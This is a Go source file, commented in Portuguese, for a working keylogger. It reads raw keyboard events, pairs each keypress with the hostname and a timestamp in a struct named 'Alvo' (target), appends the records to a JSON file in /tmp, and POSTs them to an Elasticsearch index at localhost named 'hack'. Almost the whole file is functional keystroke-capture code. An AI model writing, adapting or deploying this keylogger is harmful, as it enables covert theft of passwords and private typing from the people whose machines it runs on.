package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

//Declaracao da estrutura do json
type Alvo struct {
	Hostname string `json:"hostname"`
	Hora     string `json:"hora"`
	Keypress string `json:"tecla"`
}

const (
	layoutUS = "2006-01-02 15:04:05"
)

//Gethostname pega o hostname da maquina
func GetHostname() (hostname string) {
	// Create logger
	logger := logrus.New()
	cmd := exec.Command("uname", "-n")
	out, err := cmd.CombinedOutput()
	if err != nil {
		logger.WithError(err).Fatal("erro ao ler o hostname")
	}
	hostname = strings.TrimSuffix(string(out), "\n")

	return string(hostname)
}

//GetTime pega a hora local da maquina
func GetTime() (hora string) {
	timenow := time.Now()
	hora = (timenow.Format(layoutUS))
	return string(hora)
}

func main() {

	// Acha o tipo de teclado,nao requer permissao de root
	keyboard := keylogger.FindKeyboardDevice()

	// Verifica se o caminho do teclado
	if len(keyboard) <= 0 {
		logrus.Error("Teclado nao encontrado...vc precica passar o caminho do device")
		return
	}

	logrus.Println("Teclado achado", keyboard)

	// Inicializa a leitura do keylogger
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()

	// range de eventos
	for e := range events {
		switch e.Type {
		// O EvKey é usado para descrever alterações de estado de teclados, botões ou outros dispositivos semelhantes a teclas.
		case keylogger.EvKey:

			// if do estado de tecla precionada
			if e.KeyPress() {
				dados := &Alvo{
					Hostname: GetHostname(),
					Hora:     GetTime(),
					Keypress: e.KeyString(),
				}

				file, _ := json.MarshalIndent(dados, "", " ")

				if err != nil {
					fmt.Println(err)
					return
				}

				f, err := os.OpenFile("/tmp/teclado-"+GetHostname()+".json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if err != nil {
					log.Println(err)
				}
				defer f.Close()
				if _, err := f.WriteString(string(file) + "\n"); err != nil {
					log.Println(err)
				}
				//Para DEBUG - mostra os dados do array
				//fmt.Printf("host %s voce digitou %s \n", dados.Hostname, dados.Keypress)

				///////////////////////////
				//codigo para enviar pro elastic (dando erro na query de envio)
				buf := new(bytes.Buffer)
				json.NewEncoder(buf).Encode(dados)
				req, _ := http.NewRequest("POST", "http://localhost:9200/index/hack", buf)
				req.Header.Set("Content-Type", "application/json")
				client := &http.Client{}
				res, e := client.Do(req)
				if e != nil {
					log.Fatal(e)
				}

				defer res.Body.Close()

				//Para DEBUG - mostra na tela o status do envio
				//fmt.Println("response Status:", res.Status)

				//Para DEBUG - mostra a saida da var body
				//io.Copy(os.Stdout, res.Body)

				/////////////////////////////
			}
			break

		}
	}
}
